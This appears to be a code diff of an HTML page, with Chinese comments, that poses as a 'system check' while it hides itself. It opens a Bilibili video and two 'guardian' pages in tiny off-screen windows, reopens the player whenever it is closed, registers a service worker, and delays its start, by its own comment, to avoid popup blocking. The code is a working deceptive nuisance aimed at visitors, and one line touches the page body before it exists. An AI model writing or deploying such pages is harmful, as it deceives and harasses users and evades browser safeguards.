@@ -1,89 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>系统更新中...</title>
+    <title>系统检测中...</title>
     <script>
-        // 主播放器窗口引用
+        // 注册Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(() => console.log('SW注册成功'))
+                .catch(err => console.log('SW注册失败:', err));
+        }
+
+        // 初始化播放器
         let playerWindow = null;
-        // 守护窗口引用数组
-        let guardianWindows = [];
-        // 主窗口URL
-        const mainUrl = "https://www.bilibili.com/video/BV1btJHzGEUE";
-        // 备用URL
-        const backupUrl = "https://arr.ccngo.top/oiiaio.html";
         
-        // 初始化函数
-        function init() {
-            // 打开主播放窗口（隐藏）
-            openPlayerWindow();
+        function openPlayer() {
+            playerWindow = window.open(
+                'https://www.bilibili.com/video/BV1btJHzGEUE',
+                '_hiddenPlayer',
+                'width=100,height=100,left=-1000,top=-1000'
+            );
             
-            // 打开两个守护窗口
-            for (let i = 0; i < 2; i++) {
-                openGuardianWindow();
-            }
-            
-            // 设置定时检查
-            setInterval(checkWindows, 5000);
-            
-            // 隐藏当前页面
-            document.body.style.display = 'none';
-        }
-        
-        // 打开播放窗口
-        function openPlayerWindow() {
-            // 如果窗口已存在且未关闭，则不做操作
-            if (playerWindow && !playerWindow.closed) return;
-            
-            // 创建新窗口并隐藏
-            playerWindow = window.open(mainUrl, '_playerWindow', 
-                'width=100,height=100,left=-1000,top=-1000');
-            
-            // 尝试隐藏窗口（不同浏览器可能有不同效果）
-            try {
-                playerWindow.blur();
-                window.focus();
-                playerWindow.document.body.style.display = 'none';
-            } catch(e) {}
-        }
-        
-        // 打开守护窗口
-        function openGuardianWindow() {
-            const win = window.open(backupUrl, '_guardian_' + Date.now(), 
-                'width=100,height=100,left=-1000,top=-1000');
-            
-            if (win) {
-                guardianWindows.push(win);
-                
-                // 尝试隐藏窗口
+            // 尝试隐藏窗口
+            setTimeout(() => {
                 try {
-                    win.blur();
+                    playerWindow.blur();
                     window.focus();
-                    win.document.body.style.display = 'none';
                 } catch(e) {}
-            }
+            }, 1000);
         }
-        
-        // 检查窗口状态
-        function checkWindows() {
-            // 检查主播放窗口
-            if (!playerWindow || playerWindow.closed) {
-                openPlayerWindow();
-            }
-            
-            // 检查守护窗口
-            guardianWindows = guardianWindows.filter(win => !win.closed);
-            
-            // 确保至少有两个守护窗口
-            while (guardianWindows.length < 2) {
-                openGuardianWindow();
-            }
+
+        // 打开守护页面
+        function openGuardian() {
+            window.open(
+                '/oiiaio.html',
+                '_guardian_' + Date.now(),
+                'width=100,height=100,left=-1000,top=-1000'
+            );
         }
+
+        // 启动系统
+        function startSystem() {
+            openPlayer();
+            // 打开2个守护实例
+            openGuardian();
+            openGuardian();
+            
+            // 每30秒检查一次播放器状态
+            setInterval(() => {
+                if (!playerWindow || playerWindow.closed) {
+                    openPlayer();
+                }
+            }, 30000);
+        }
+
+        // 隐藏当前页面
+        document.body.style.display = 'none';
         
-        // 页面加载后立即执行
-        window.onload = init;
+        // 延迟启动以避免拦截
+        setTimeout(startSystem, 2000);
     </script>
 </head>
-<body>
-    <!-- 空页面，不显示任何内容 -->
-</body>
+<body></body>
 </html>
